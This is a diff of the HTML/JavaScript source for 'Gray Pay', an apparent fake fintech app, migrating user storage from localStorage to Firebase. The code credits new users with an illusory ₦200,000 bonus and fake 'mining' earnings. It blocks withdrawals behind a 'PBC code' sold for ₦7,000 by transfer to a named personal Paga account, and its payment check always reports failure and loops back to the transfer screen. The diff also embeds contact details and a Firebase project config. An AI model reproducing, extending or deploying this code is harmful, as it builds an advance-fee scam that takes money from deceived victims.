@@ -4,6 +4,36 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>Gray Pay - Complete</title>
+    <!-- Firebase SDKs -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
+        import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-auth.js";
+        import { getFirestore, doc, setDoc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDRQsnce5A337wRzOjjwEcgiXDgplJq5lU",
+            authDomain: "growfastng.firebaseapp.com",
+            projectId: "growfastng",
+            storageBucket: "growfastng.firebasestorage.app",
+            messagingSenderId: "133938265658",
+            appId: "1:133938265658:web:4396fd308606de3ad43f03",
+            measurementId: "G-0K8H201KX0"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+
+        window.auth = auth;
+        window.db = db;
+        window.createUserWithEmailAndPassword = createUserWithEmailAndPassword;
+        window.signInWithEmailAndPassword = signInWithEmailAndPassword;
+        window.signOut = signOut;
+        window.doc = doc;
+        window.setDoc = setDoc;
+        window.getDoc = getDoc;
+        window.updateDoc = updateDoc;
+    </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background-color: #0a0a0a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #fff; }
@@ -128,14 +158,10 @@
 <div id="helpModal" class="modal"><div class="modal-content"><h3>Contact Support</h3><button class="btn" onclick="window.open('https://wa.me/2348168909003','_blank')">💬 WhatsApp</button><button class="btn" style="margin-top: 12px;" onclick="location.href='mailto:graypay423492@gmail.com'">📧 Email</button><button class="btn" style="margin-top: 12px;" onclick="closeHelp()">Close</button></div></div>
 <div id="loadingOverlay" class="loading"><div>⏳</div><div id="loadingMsg">Processing...</div></div>
 
-<script>
+<script type="module">
     let currentUser = null;
-    let users = [];
+    let currentUserData = null;
     let miningTimer = null;
-
-    function loadUsers() { let s = localStorage.getItem('graypay_users'); if(s) users = JSON.parse(s); else users = []; }
-    function saveUsers() { localStorage.setItem('graypay_users', JSON.stringify(users)); }
-    function openWhatsApp() { window.open('https://wa.me/2348168909003','_blank'); }
 
     function showPage(id) {
         document.getElementById('welcomePage').classList.add('hidden');
@@ -144,601 +170,135 @@
         document.getElementById('dashboardPage').classList.add('hidden');
         let el = document.getElementById(id);
         if(el) el.classList.remove('hidden');
-        if(id === 'dashboardPage' && currentUser) updateDashboard();
+        if(id === 'dashboardPage' && currentUserData) updateDashboard();
     }
-    function showWelcomePage() { showPage('welcomePage'); }
-    function showSignupPage() { showPage('signupPage'); }
-    function showLoginPage() { showPage('loginPage'); }
-
+    
+    window.showWelcomePage = () => showPage('welcomePage');
+    window.showSignupPage = () => showPage('signupPage');
+    window.showLoginPage = () => showPage('loginPage');
+    
     function updateDashboard() {
-        if(currentUser) {
-            document.getElementById('userName').innerText = currentUser.firstname;
-            document.getElementById('userBalance').innerHTML = `₦${currentUser.balance}`;
-            let percent = (currentUser.balance / 200000) * 100;
+        if(currentUserData) {
+            document.getElementById('userName').innerText = currentUserData.firstname;
+            document.getElementById('userBalance').innerHTML = `₦${currentUserData.balance}`;
+            let percent = (currentUserData.balance / 200000) * 100;
             if(percent > 100) percent = 100;
             document.getElementById('progressFill').style.width = percent + '%';
         }
     }
-
-    function showDashboardPage() { updateDashboard(); showPage('dashboardPage'); }
-
-    // ========== SIGNUP (FIXED) ==========
-    function signup() {
-        loadUsers();
+    
+    window.showDashboardPage = () => { updateDashboard(); showPage('dashboardPage'); };
+    
+    window.signup = async () => {
         let fn = document.getElementById('signupFirstname').value.trim();
         let sn = document.getElementById('signupSurname').value.trim();
         let em = document.getElementById('signupEmail').value.trim();
         let pw = document.getElementById('signupPassword').value;
         let cf = document.getElementById('signupConfirm').value;
+        
         if(!fn || !sn || !em || !pw) { document.getElementById('signupError').innerText = 'All fields required'; return; }
         if(pw.length < 8) { document.getElementById('signupError').innerText = 'Password must be 8+ characters'; return; }
         if(pw !== cf) { document.getElementById('signupError').innerText = 'Passwords do not match'; return; }
-        for(let u of users) if(u.email === em) { document.getElementById('signupError').innerText = 'Email exists'; return; }
-        let newUser = { id: Date.now(), firstname: fn, surname: sn, email: em, password: pw, balance: 200000, miningActive: false, miningEnd: null, transactions: [{ type: 'Bonus', amount: 200000, date: new Date().toLocaleString(), dateObj: new Date(), status: 'Success', fullDetails: { transactionType: 'Bonus', sender: 'Gray Pay', recipient: fn + ' ' + sn, amount: 200000, note: 'Welcome bonus' } }] };
-        users.push(newUser); 
-        saveUsers();
-        currentUser = newUser; 
-        localStorage.setItem('graypay_current', em);
-        // Verify save worked
-        let verify = localStorage.getItem('graypay_users');
-        if(!verify) { alert("Warning: Your browser may be in private mode. Data will not be saved after closing."); }
-        showDashboardPage();
-        showWelcomePopup();
-    }
-
-    // ========== LOGIN (FIXED) ==========
-    function login() {
-        loadUsers();
+        
+        document.getElementById('signupError').innerText = '';
+        showLoading('Creating account...', 0);
+        
+        try {
+            const userCredential = await window.createUserWithEmailAndPassword(window.auth, em, pw);
+            const user = userCredential.user;
+            
+            const userData = {
+                firstname: fn,
+                surname: sn,
+                email: em,
+                balance: 200000,
+                miningActive: false,
+                miningEnd: null,
+                transactions: [{ type: 'Bonus', amount: 200000, date: new Date().toLocaleString(), dateObj: new Date(), status: 'Success', fullDetails: { transactionType: 'Bonus', sender: 'Gray Pay', recipient: fn + ' ' + sn, amount: 200000, note: 'Welcome bonus' } }]
+            };
+            
+            await window.setDoc(window.doc(window.db, 'users', user.uid), userData);
+            currentUser = user;
+            currentUserData = userData;
+            hideLoading();
+            showDashboardPage();
+            showWelcomePopup();
+        } catch (error) {
+            hideLoading();
+            if(error.code === 'auth/email-already-in-use') {
+                document.getElementById('signupError').innerText = 'Email already exists';
+            } else {
+                document.getElementById('signupError').innerText = error.message;
+            }
+        }
+    };
+    
+    window.login = async () => {
         let em = document.getElementById('loginEmail').value.trim();
         let pw = document.getElementById('loginPassword').value;
         
-        if(users.length === 0) {
-            document.getElementById('loginError').innerText = 'No accounts found. Please create an account first.';
-            return;
-        }
+        document.getElementById('loginError').innerText = '';
+        showLoading('Logging in...', 0);
         
-        let found = null;
-        for(let u of users) {
-            if(u.email === em && u.password === pw) {
-                found = u;
-                break;
-            }
-        }
-        
-        if(found) { 
-            currentUser = found; 
-            localStorage.setItem('graypay_current', em); 
-            showDashboardPage(); 
-            return; 
-        }
-        document.getElementById('loginError').innerText = 'Invalid email or password';
-    }
-
-    function autoLogin() { loadUsers(); let saved = localStorage.getItem('graypay_current'); if(saved) { for(let u of users) if(u.email === saved) { currentUser = u; showDashboardPage(); return; } } showWelcomePage(); }
-
-    function showProfile() {
-        if(!currentUser) return;
-        document.getElementById('dynamicContent').innerHTML = `<div id="profileView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="logo">Profile</div><div class="info-box">Full Name: ${currentUser.firstname} ${currentUser.surname}</div><div class="info-box">Email: ${currentUser.email}</div><div class="info-box">Password: ********</div><button class="btn" onclick="logout()">Log Out</button></div>`;
-        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('profileView').style.display = 'block'; document.getElementById('profileView').style.padding = '20px';
-    }
-    function logout() { currentUser = null; localStorage.removeItem('graypay_current'); closeDynamic(); showWelcomePage(); }
-    function closeDynamic() { document.getElementById('dynamicContent').innerHTML = ''; showDashboardPage(); }
-
-    function showSuccessPopup(title, message, amount, recipient, bank, account, transactionId, onViewReceipt) {
-        let popupHtml = `
-            <div id="successPopup" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 3000;">
-                <div style="background: #1f1f1f; border-radius: 20px; padding: 25px; width: 85%; max-width: 380px; text-align: center;">
-                    <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
-                    <h3 style="color: #10b981; margin-bottom: 10px;">${title}</h3>
-                    <p style="color: #9ca3af; margin-bottom: 15px;">${message}</p>
-                    <div style="font-size: 32px; font-weight: bold; color: #fff; margin-bottom: 15px;">-₦${amount.toLocaleString()}.00</div>
-                    <div style="background: #2a2a2a; border-radius: 12px; padding: 12px; margin-bottom: 20px;">
-                        <p style="color: #fff; font-size: 14px;">to ${recipient}</p>
-                        <p style="color: #9ca3af; font-size: 12px;">${bank} - ${account}</p>
-                    </div>
-                    <div style="display: flex; gap: 12px;">
-                        <button class="btn" onclick="closeSuccessPopupAndGoDashboard()" style="flex: 1;">Done</button>
-                        <button class="btn" onclick="closeSuccessPopupAndViewReceipt('${transactionId}')" style="flex: 1; background: #2a2a2a;">View receipt</button>
-                    </div>
-                </div>
-            </div>
-        `;
-        document.body.insertAdjacentHTML('beforeend', popupHtml);
-        
-        window.closeSuccessPopupAndGoDashboard = function() {
-            let popup = document.getElementById('successPopup');
-            if(popup) popup.remove();
-            closeDynamic();
-            showDashboardPage();
-        };
-        
-        window.closeSuccessPopupAndViewReceipt = function(id) {
-            let popup = document.getElementById('successPopup');
-            if(popup) popup.remove();
-            if(onViewReceipt) onViewReceipt();
-            else showTransactionDetails(id);
-        };
-    }
-
-    function showAirtimeSuccessPopup(amount, phone, transactionId, onViewReceipt) {
-        let popupHtml = `
-            <div id="successPopup" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 3000;">
-                <div style="background: #1f1f1f; border-radius: 20px; padding: 25px; width: 85%; max-width: 380px; text-align: center;">
-                    <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
-                    <h3 style="color: #10b981; margin-bottom: 10px;">Airtime Purchase Successful!</h3>
-                    <p style="color: #9ca3af; margin-bottom: 15px;">You have successfully purchased</p>
-                    <div style="font-size: 32px; font-weight: bold; color: #fff; margin-bottom: 15px;">₦${amount.toLocaleString()}.00</div>
-                    <div style="background: #2a2a2a; border-radius: 12px; padding: 12px; margin-bottom: 20px;">
-                        <p style="color: #fff; font-size: 14px;">to ${phone}</p>
-                    </div>
-                    <div style="display: flex; gap: 12px;">
-                        <button class="btn" onclick="closeSuccessPopupAndGoDashboard()" style="flex: 1;">Done</button>
-                        <button class="btn" onclick="closeSuccessPopupAndViewReceipt('${transactionId}')" style="flex: 1; background: #2a2a2a;">View receipt</button>
-                    </div>
-                </div>
-            </div>
-        `;
-        document.body.insertAdjacentHTML('beforeend', popupHtml);
-        
-        window.closeSuccessPopupAndGoDashboard = function() {
-            let popup = document.getElementById('successPopup');
-            if(popup) popup.remove();
-            closeDynamic();
-            showDashboardPage();
-        };
-        
-        window.closeSuccessPopupAndViewReceipt = function(id) {
-            let popup = document.getElementById('successPopup');
-            if(popup) popup.remove();
-            if(onViewReceipt) onViewReceipt();
-            else showTransactionDetails(id);
-        };
-    }
-
-    function showDataSuccessPopup(amount, phone, plan, transactionId, onViewReceipt) {
-        let popupHtml = `
-            <div id="successPopup" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.9); display: flex; align-items: center; justify-content: center; z-index: 3000;">
-                <div style="background: #1f1f1f; border-radius: 20px; padding: 25px; width: 85%; max-width: 380px; text-align: center;">
-                    <div style="font-size: 50px; margin-bottom: 10px;">✅</div>
-                    <h3 style="color: #10b981; margin-bottom: 10px;">Data Purchase Successful!</h3>
-                    <p style="color: #9ca3af; margin-bottom: 15px;">You have successfully purchased</p>
-                    <div style="font-size: 24px; font-weight: bold; color: #fff; margin-bottom: 10px;">${plan}</div>
-                    <div style="font-size: 20px; font-weight: bold; color: #fff; margin-bottom: 15px;">₦${amount.toLocaleString()}.00</div>
-                    <div style="background: #2a2a2a; border-radius: 12px; padding: 12px; margin-bottom: 20px;">
-                        <p style="color: #fff; font-size: 14px;">to ${phone}</p>
-                    </div>
-                    <div style="display: flex; gap: 12px;">
-                        <button class="btn" onclick="closeSuccessPopupAndGoDashboard()" style="flex: 1;">Done</button>
-                        <button class="btn" onclick="closeSuccessPopupAndViewReceipt('${transactionId}')" style="flex: 1; background: #2a2a2a;">View receipt</button>
-                    </div>
-                </div>
-            </div>
-        `;
-        document.body.insertAdjacentHTML('beforeend', popupHtml);
-        
-        window.closeSuccessPopupAndGoDashboard = function() {
-            let popup = document.getElementById('successPopup');
-            if(popup) popup.remove();
-            closeDynamic();
-            showDashboardPage();
-        };
-        
-        window.closeSuccessPopupAndViewReceipt = function(id) {
-            let popup = document.getElementById('successPopup');
-            if(popup) popup.remove();
-            if(onViewReceipt) onViewReceipt();
-            else showTransactionDetails(id);
-        };
-    }
-
-    function showWithdrawPage() {
-        if(!currentUser) return;
-        let banks = ['Access Bank', 'GTBank', 'First Bank', 'Zenith Bank', 'UBA', 'WEMA Bank', 'Polaris Bank', 'Fidelity Bank', 'Sterling Bank', 'PalmPay', 'Opay', 'Moniepoint', 'Kuda Bank'];
-        let opts = banks.map(b => `<option>${b}</option>`).join('');
-        document.getElementById('dynamicContent').innerHTML = `<div id="withdrawView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Transfer To Bank</h2><input type="text" id="accName" class="input-field" placeholder="Account Name"><input type="text" id="accNumber" class="input-field" placeholder="Account Number"><select id="bankName" class="input-field">${opts}</select><input type="number" id="withdrawAmount" class="input-field" placeholder="Amount"><input type="text" id="pbcCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><div class="info-box">Available: ₦${currentUser.balance}</div><div class="min-withdrawal">⚠️ Minimum withdrawal: ₦100,000</div><button class="btn" onclick="processWithdraw()">Submit</button></div>`;
-        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('withdrawView').style.display = 'block'; document.getElementById('withdrawView').style.padding = '20px';
-    }
-    
-    function processWithdraw() {
-        let amt = parseInt(document.getElementById('withdrawAmount').value);
-        let code = document.getElementById('pbcCode').value;
-        let accName = document.getElementById('accName').value;
-        let accNumber = document.getElementById('accNumber').value;
-        let bankName = document.getElementById('bankName').value;
-        
-        if(code !== '4234') { alert('Invalid PBC Code!'); return; }
-        if(amt < 100000) { alert('Minimum withdrawal is ₦100,000'); return; }
-        if(amt > currentUser.balance) { alert('Insufficient balance'); return; }
-        if(!accName || !accNumber) { alert('Please fill account name and number'); return; }
-        
-        showLoading('Processing withdrawal...', 15000, () => { 
-            currentUser.balance -= amt; 
-            let transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
-            let transaction = { 
-                id: transactionId,
-                type: 'Withdrawal', 
-                amount: amt, 
-                date: new Date().toLocaleString(),
-                dateObj: new Date(),
-                status: 'Success',
-                fullDetails: {
-                    transactionType: 'Deposit To Bank',
-                    amount: amt,
-                    fees: 10,
-                    taxes: 0.75,
-                    sender: currentUser.firstname + ' ' + currentUser.surname,
-                    recipient: accName,
-                    recipientAccount: accNumber,
-                    recipientBank: bankName,
-                    transactionId: transactionId,
-                    note: 'Sent from my Gray Pay account'
-                }
-            };
-            currentUser.transactions.unshift(transaction); 
-            saveUsers(); 
+        try {
+            const userCredential = await window.signInWithEmailAndPassword(window.auth, em, pw);
+            const user = userCredential.user;
             
-            showSuccessPopup(
-                'Withdrawal Successful!',
-                'You have successfully withdrawn',
-                amt,
-                accName,
-                bankName,
-                accNumber,
-                transactionId,
-                () => showTransactionDetails(transactionId)
-            );
-        });
-    }
-
-    function showBuyAirtime() {
-        if(!currentUser) return;
-        document.getElementById('dynamicContent').innerHTML = `<div id="airtimeView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Airtime</h2><input type="text" id="airPhone" class="input-field" placeholder="Phone Number"><input type="number" id="airAmount" class="input-field" placeholder="Amount"><input type="text" id="airCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><button class="btn" onclick="processAirtime()">Buy Airtime</button></div>`;
-        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('airtimeView').style.display = 'block'; document.getElementById('airtimeView').style.padding = '20px';
-    }
-    
-    function processAirtime() {
-        let code = document.getElementById('airCode').value;
-        let amt = parseInt(document.getElementById('airAmount').value);
-        let phone = document.getElementById('airPhone').value;
-        if(code !== '4234') { alert('Invalid PBC Code!'); return; }
-        if(!phone || !amt) { alert('Fill all fields'); return; }
-        if(amt > currentUser.balance) { alert('Insufficient balance'); return; }
-        showLoading('Processing...', 10000, () => { 
-            currentUser.balance -= amt; 
-            let transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
-            let transaction = {
-                id: transactionId,
-                type: 'Airtime', 
-                amount: amt, 
-                phone: phone,
-                date: new Date().toLocaleString(),
-                dateObj: new Date(),
-                status: 'Success',
-                fullDetails: {
-                    transactionType: 'Airtime Purchase',
-                    amount: amt,
-                    fees: 0,
-                    taxes: 0,
-                    sender: currentUser.firstname + ' ' + currentUser.surname,
-                    recipient: phone,
-                    recipientAccount: phone,
-                    recipientBank: 'Telecom',
-                    transactionId: transactionId,
-                    note: 'Airtime purchase'
-                }
-            };
-            currentUser.transactions.unshift(transaction); 
-            saveUsers(); 
-            showAirtimeSuccessPopup(amt, phone, transactionId, () => showTransactionDetails(transactionId));
-        });
-    }
-
-    function showBuyData() {
-        if(!currentUser) return;
-        document.getElementById('dynamicContent').innerHTML = `<div id="dataView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy Data</h2><input type="text" id="dataPhone" class="input-field" placeholder="Phone Number"><select id="dataPlan" class="input-field"><option value="500">500MB - ₦500</option><option value="1000">1GB - ₦1000</option><option value="2000">2GB - ₦2000</option><option value="5000">5GB - ₦5000</option><option value="10000">10GB - ₦10000</option></select><input type="text" id="dataCode" class="input-field" placeholder="PBC Code (e.g., 1234)"><button class="btn" onclick="processData()">Buy Data</button></div>`;
-        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('dataView').style.display = 'block'; document.getElementById('dataView').style.padding = '20px';
-    }
-    
-    function processData() {
-        let code = document.getElementById('dataCode').value;
-        let phone = document.getElementById('dataPhone').value;
-        let plan = document.getElementById('dataPlan');
-        let amt = parseInt(plan.value);
-        let name = plan.options[plan.selectedIndex].text;
-        if(code !== '4234') { alert('Invalid PBC Code!'); return; }
-        if(!phone) { alert('Enter phone number'); return; }
-        if(amt > currentUser.balance) { alert('Insufficient balance'); return; }
-        showLoading('Processing...', 10000, () => { 
-            currentUser.balance -= amt; 
-            let transactionId = 'TXN' + Date.now() + Math.floor(Math.random() * 1000);
-            let transaction = {
-                id: transactionId,
-                type: 'Data', 
-                amount: amt, 
-                plan: name,
-                phone: phone,
-                date: new Date().toLocaleString(),
-                dateObj: new Date(),
-                status: 'Success',
-                fullDetails: {
-                    transactionType: 'Data Purchase',
-                    amount: amt,
-                    fees: 0,
-                    taxes: 0,
-                    sender: currentUser.firstname + ' ' + currentUser.surname,
-                    recipient: phone,
-                    recipientAccount: phone,
-                    recipientBank: 'Telecom',
-                    transactionId: transactionId,
-                    note: 'Data purchase - ' + name
-                }
-            };
-            currentUser.transactions.unshift(transaction); 
-            saveUsers(); 
-            showDataSuccessPopup(amt, phone, name, transactionId, () => showTransactionDetails(transactionId));
-        });
-    }
-
-    function showBuyPBC() {
-        if(!currentUser) return;
-        document.getElementById('dynamicContent').innerHTML = `<div id="pbcView"><div class="header"><button class="back-btn" onclick="closeDynamic()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Buy PBC</h2><div class="info-box">Amount: ₦7,000 (Fixed)</div><input type="text" id="pbcName" class="input-field" placeholder="Full Name"><input type="email" id="pbcEmail" class="input-field" placeholder="Email Address"><button id="pbcPayBtn" class="btn btn-gray" disabled onclick="pbcStep1()">Pay</button></div>`;
-        showPage('dashboardPage'); document.getElementById('dashboardPage').classList.add('hidden'); document.getElementById('pbcView').style.display = 'block'; document.getElementById('pbcView').style.padding = '20px';
-        let nameInp = document.getElementById('pbcName');
-        let emailInp = document.getElementById('pbcEmail');
-        let btn = document.getElementById('pbcPayBtn');
-        function check() { if(nameInp.value && emailInp.value) { btn.disabled = false; btn.className = 'btn btn-blue'; } else { btn.disabled = true; btn.className = 'btn btn-gray'; } }
-        nameInp.addEventListener('input', check); emailInp.addEventListener('input', check);
-    }
-    function pbcStep1() { showLoading('Processing...', 10000, () => showPalmPayWarning()); }
-    function showPalmPayWarning() {
-        document.getElementById('dynamicContent').innerHTML = `<div id="warningView"><div class="header"><button class="back-btn" onclick="goBackToPBC()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>PalmPay Service Down</h2><p>Please do not use PalmPay for payments at this time. Use other supported banks.</p></div><button class="btn" onclick="pbcStep2()">Proceed to Bank Transfer</button><button class="btn" style="margin-top: 12px;" onclick="pbcStep2()">I Understand</button></div>`;
-        document.getElementById('warningView').style.display = 'block'; document.getElementById('warningView').style.padding = '20px';
-    }
-    function goBackToPBC() { showBuyPBC(); }
-    function pbcStep2() { showLoading('Processing...', 5000, () => showBankDetails()); }
-    function copyText(txt, el) { navigator.clipboard.writeText(txt); let orig = el.innerHTML; el.innerHTML = txt + ' ✅ Copied!'; setTimeout(() => el.innerHTML = orig, 2000); }
-    function showBankDetails() {
-        document.getElementById('dynamicContent').innerHTML = `<div id="bankView"><div class="header"><button class="back-btn" onclick="goBackToWarning()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><h2>Bank Transfer</h2><div class="copy-item" onclick="copyText('7000', this.querySelector('.copy-text'))"><span class="copy-text"><strong>Amount:</strong> NGN 7,000</span><span class="copy-icon">📋 Copy</span></div><div class="copy-item" onclick="copyText('2778715377', this.querySelector('.copy-text'))"><span class="copy-text"><strong>Account Number:</strong> 2778715377</span><span class="copy-icon">📋 Copy</span></div><div class="info-box"><strong>Bank Name:</strong> Paga</div><div class="info-box"><strong>Account Name:</strong> Ahmed Isah</div><p class="text-center mb-10">Transfer exact amount. Use your name as description.</p><button class="btn" onclick="pbcStep3()">I have made this bank transfer</button></div>`;
-        document.getElementById('bankView').style.display = 'block'; document.getElementById('bankView').style.padding = '20px';
-    }
-    function goBackToWarning() { showPalmPayWarning(); }
-    function pbcStep3() { showLoading('Verifying payment...', 20000, () => showFailed()); }
-    function showFailed() {
-        document.getElementById('dynamicContent').innerHTML = `<div id="failedView"><div class="header"><button class="back-btn" onclick="goBackToBank()">←</button><button class="help-btn" onclick="showHelp()">❓</button></div><div class="warning-box"><h2>Transaction verification failed!</h2><p>No Payment received from you / invalid payment method.</p></div><button class="btn" onclick="goBackToBank()">Try Again</button><button class="btn" style="margin-top: 12px;" onclick="showHelp()">❓ You Need Help?</button></div>`;
-        document.getElementById('failedView').style.display = 'block'; document.getElementById('failedView').style.padding = '20px';
-    }
-    function goBackToBank() { showBankDetails(); }
-
-    function startMining() {
-        if(!currentUser) return;
-        if(currentUser.miningActive) { alert('Mining already active!'); return; }
-        currentUser.miningActive = true;
-        currentUser.miningEnd = Date.now() + 24*60*60*1000;
-        saveUsers();
-        alert('Mining started! Balance increases every hour.');
-        if(miningTimer) clearInterval(miningTimer);
-        miningTimer = setInterval(() => {
-            if(!currentUser || !currentUser.miningActive) { clearInterval(miningTimer); return; }
-            if(Date.now() >= currentUser.miningEnd) { currentUser.miningActive = false; clearInterval(miningTimer); saveUsers(); alert('Mining complete! +₦200,000'); updateDashboard(); return; }
-            currentUser.balance += Math.floor(200000/24);
-            saveUsers(); updateDashboard();
-        }, 3600000);
-    }
-
-    function showTransactionHistory() {
-        if(!currentUser) return;
-        
-        let transactions = [...currentUser.transactions];
-        
-        let groups = {};
-        transactions.forEach(t => {
-            let dateKey;
-            let dateObj = t.dateObj ? new Date(t.dateObj) : new Date(t.date);
-            let today = new Date();
-            let yesterday = new Date(today);
-            yesterday.setDate(yesterday.getDate() - 1);
-            
-            if (dateObj.toDateString() === today.toDateString()) {
-                dateKey = 'Today';
-            } else if (dateObj.toDateString() === yesterday.toDateString()) {
-                dateKey = 'Yesterday';
+            const userDoc = await window.getDoc(window.doc(window.db, 'users', user.uid));
+            if(userDoc.exists()) {
+                currentUser = user;
+                currentUserData = userDoc.data();
+                hideLoading();
+                showDashboardPage();
             } else {
-                dateKey = dateObj.toLocaleDateString('en-GB', { day: '2-digit', month: 'short', year: 'numeric' });
+                hideLoading();
+                document.getElementById('loginError').innerText = 'User data not found';
             }
-            
-            if (!groups[dateKey]) groups[dateKey] = [];
-            groups[dateKey].push(t);
-        });
-        
-        let historyHtml = '';
-        for (let [date, items] of Object.entries(groups)) {
-            historyHtml += `<div class="history-date-group"><div class="history-date">${date}</div>`;
-            items.forEach(t => {
-                let timeStr = t.dateObj ? new Date(t.dateObj).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : new Date(t.date).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-                let desc = '';
-                let isNegative = true;
-                
-                if (t.type === 'Withdrawal') {
-                    desc = `You sent money to ${t.fullDetails?.recipient || 'Bank'} ${t.fullDetails?.recipientAccount ? t.fullDetails.recipientAccount.slice(0, 4) + '...' : ''}`;
-                } else if (t.type === 'Airtime') {
-                    desc = `You bought airtime for ${t.phone}`;
-                } else if (t.type === 'Data') {
-                    desc = `You bought ${t.plan} data for ${t.phone}`;
-                } else if (t.type === 'Bonus') {
-                    desc = `You received a welcome bonus`;
-                    isNegative = false;
-                }
-                
-                historyHtml += `
-                    <div class="history-item" onclick="showTransactionDetails('${t.id}')">
-                        <div class="history-row">
-                            <div class="history-desc">
-                                ${desc}
-                                <small>${timeStr}</small>
-                            </div>
-                            <div class="history-amount ${isNegative ? 'negative' : 'positive'}">
-                                ${isNegative ? '-₦' : '+₦'}${t.amount.toLocaleString()}
-                            </div>
-                        </div>
-                    </div>
-                `;
-            });
-            historyHtml += `</div>`;
+        } catch (error) {
+            hideLoading();
+            if(error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
+                document.getElementById('loginError').innerText = 'Invalid email or password';
+            } else {
+                document.getElementById('loginError').innerText = error.message;
+            }
         }
-        
-        document.getElementById('dynamicContent').innerHTML = `
-            <div id="historyView">
-                <div class="header">
-                    <button class="back-btn" onclick="closeDynamic()">←</button>
-                    <button class="help-btn" onclick="showHelp()">❓</button>
-                </div>
-                <h2>Transaction history</h2>
-                ${historyHtml || '<div class="text-center" style="color:#9ca3af; padding: 40px;">No transactions yet</div>'}
-            </div>
-        `;
-        showPage('dashboardPage');
-        document.getElementById('dashboardPage').classList.add('hidden');
-        document.getElementById('historyView').style.display = 'block';
-        document.getElementById('historyView').style.padding = '20px';
-    }
+    };
     
-    function showTransactionDetails(transactionId) {
-        if(!currentUser) return;
-        
-        let transaction = currentUser.transactions.find(t => t.id == transactionId);
-        if(!transaction) {
-            alert('Transaction not found');
-            return;
-        }
-        
-        let details = transaction.fullDetails || {};
-        let amount = details.amount || transaction.amount;
-        let dateStr = transaction.date;
-        let type = transaction.type;
-        let status = transaction.status || 'Success';
-        let fees = details.fees || 0;
-        let taxes = details.taxes || 0;
-        let sender = details.sender || currentUser.firstname + ' ' + currentUser.surname;
-        let recipient = details.recipient || (type === 'Airtime' ? transaction.phone : type === 'Data' ? transaction.phone : 'Bank Transfer');
-        let recipientAccount = details.recipientAccount || (type === 'Airtime' ? transaction.phone : type === 'Data' ? transaction.phone : '****');
-        let recipientBank = details.recipientBank || (type === 'Airtime' ? 'Telecom' : type === 'Data' ? 'Telecom' : 'Bank');
-        let transId = details.transactionId || transaction.id || 'N/A';
-        let note = details.note || (type === 'Bonus' ? 'Welcome bonus from Gray Pay' : `Transaction via Gray Pay`);
-        
-        let detailsHtml = `
-            <div id="transactionDetailView">
-                <div class="header">
-                    <button class="back-btn" onclick="goBackToHistory()">←</button>
-                    <button class="help-btn" onclick="showHelp()">❓</button>
-                </div>
-                <h2>Transaction details</h2>
-                <div style="text-align: center; margin: 20px 0;">
-                    <div style="font-size: 48px; font-weight: bold; color: #f87171;">-₦${amount.toLocaleString()}.00</div>
-                    <div style="color: #10b981; margin-top: 5px;">${status}</div>
-                </div>
-                
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Date</span>
-                    <span class="transaction-detail-value">${dateStr}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Amount</span>
-                    <span class="transaction-detail-value">-₦${amount.toLocaleString()}.00</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Fees</span>
-                    <span class="transaction-detail-value">₦${fees.toFixed(2)}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Taxes</span>
-                    <span class="transaction-detail-value">₦${taxes.toFixed(2)}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Transaction Type</span>
-                    <span class="transaction-detail-value">${type}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Sender</span>
-                    <span class="transaction-detail-value">${sender}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Recipient</span>
-                    <span class="transaction-detail-value">${recipient}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Recipient Account</span>
-                    <span class="transaction-detail-value">${recipientAccount}</span>
-                </div>
-                <div class="transaction-detail-row">
-                    <span class="transaction-detail-label">Recipient Bank</span>
-                    <span class="transaction-detail-value">${recipientBank}</span>
-                </div>
